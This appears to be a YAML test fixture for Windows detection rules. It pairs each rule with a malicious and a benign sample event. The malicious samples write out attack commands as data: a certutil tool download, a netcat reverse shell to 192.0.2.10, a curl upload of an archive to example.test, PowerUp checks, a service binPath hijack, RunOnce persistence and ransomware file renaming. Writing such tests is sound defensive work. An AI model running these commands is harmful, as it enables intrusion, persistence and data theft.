cases:
  - rule: rules/windows_process_creation/mshta_from_browser.yml
    expected: true
    event:
      Image: 'C:\Windows\System32\mshta.exe'
      ParentImage: 'C:\Program Files\Google\Chrome\Application\chrome.exe'
  - rule: rules/windows_process_creation/mshta_from_browser.yml
    expected: false
    event:
      Image: 'C:\Windows\System32\mshta.exe'
      ParentImage: 'C:\Windows\explorer.exe'

  - rule: rules/windows_process_creation/certutil_suspicious_download.yml
    expected: true
    event:
      Image: 'C:\Windows\System32\certutil.exe'
      CommandLine: 'certutil.exe -urlcache -split -f https://example.test/nc.exe nc.exe'
  - rule: rules/windows_process_creation/certutil_suspicious_download.yml
    expected: false
    event:
      Image: 'C:\Windows\System32\certutil.exe'
      CommandLine: 'certutil.exe -verify certificate.cer'

  - rule: rules/windows_process_creation/netcat_reverse_shell.yml
    expected: true
    event:
      Image: 'C:\Users\student\AppData\Local\Temp\nc.exe'
      CommandLine: 'nc.exe 192.0.2.10 4444 -e cmd.exe'
  - rule: rules/windows_process_creation/netcat_reverse_shell.yml
    expected: false
    event:
      Image: 'C:\Tools\nc.exe'
      CommandLine: 'nc.exe -l -p 4444'

  - rule: rules/windows_process_creation/powerup_invoke_allchecks.yml
    expected: true
    event:
      Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
      CommandLine: 'powershell.exe Import-Module .\PowerUp.ps1; Invoke-AllChecks'
  - rule: rules/windows_process_creation/powerup_invoke_allchecks.yml
    expected: false
    event:
      Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
      CommandLine: 'powershell.exe Get-Process'

  - rule: rules/windows_process_creation/service_binpath_modification.yml
    expected: true
    event:
      Image: 'C:\Windows\System32\sc.exe'
      CommandLine: 'sc.exe config BackupService binPath= C:\ProgramData\payload.exe'
  - rule: rules/windows_process_creation/service_binpath_modification.yml
    expected: false
    event:
      Image: 'C:\Windows\System32\sc.exe'
      CommandLine: 'sc.exe query BackupService'

  - rule: rules/windows_process_creation/runonce_registry_persistence.yml
    expected: true
    event:
      Image: 'C:\Windows\System32\reg.exe'
      CommandLine: 'reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce /v Update /d C:\ProgramData\update.exe'
  - rule: rules/windows_process_creation/runonce_registry_persistence.yml
    expected: false
    event:
      Image: 'C:\Windows\System32\reg.exe'
      CommandLine: 'reg.exe query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'

  - rule: rules/windows_process_creation/password_protected_7zip_archive.yml
    expected: true
    event:
      Image: 'C:\Program Files\7-Zip\7z.exe'
      CommandLine: '7z.exe a C:\Temp\collection.7z C:\Data\* -pSecret'
  - rule: rules/windows_process_creation/password_protected_7zip_archive.yml
    expected: false
    event:
      Image: 'C:\Program Files\7-Zip\7z.exe'
      CommandLine: '7z.exe a C:\Temp\backup.7z C:\Documents\*'

  - rule: rules/windows_process_creation/curl_data_exfiltration.yml
    expected: true
    event:
      Image: 'C:\Windows\System32\curl.exe'
      CommandLine: 'curl.exe -d @C:\Temp\collection.7z https://example.test/upload'
  - rule: rules/windows_process_creation/curl_data_exfiltration.yml
    expected: false
    event:
      Image: 'C:\Windows\System32\curl.exe'
      CommandLine: 'curl.exe https://example.test/status'

  - rule: rules/windows_file_event/ransomware_huntme_file_creation.yml
    expected: true
    event:
      TargetFilename: 'C:\Users\student\Documents\report.docx.huntme'
  - rule: rules/windows_file_event/ransomware_huntme_file_creation.yml
    expected: false
    event:
      TargetFilename: 'C:\Users\student\Documents\report.docx'
